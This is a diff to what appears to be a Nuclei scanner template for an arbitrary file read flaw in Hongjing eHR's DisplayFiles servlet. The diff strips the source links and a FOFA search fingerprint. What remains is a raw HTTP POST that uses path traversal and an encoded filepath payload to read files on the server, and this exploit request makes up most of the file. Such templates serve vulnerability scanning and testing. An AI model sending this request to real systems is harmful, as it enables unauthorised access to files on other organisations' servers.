@@ -3,20 +3,14 @@ info:
   name: 宏景eHR DisplayFiles 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uqnp0vsg154pc47f'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uqnp0vsg154pc47f
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'POST /templates/attestation/../../servlet/DisplayFiles HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     filepath=VHmj0PAATTP2HJBPAATTPcyRcHb6hPAATTP2HJFPAATTP59XObqwUZaPAATTP2HJBPAATTP6EvXjT
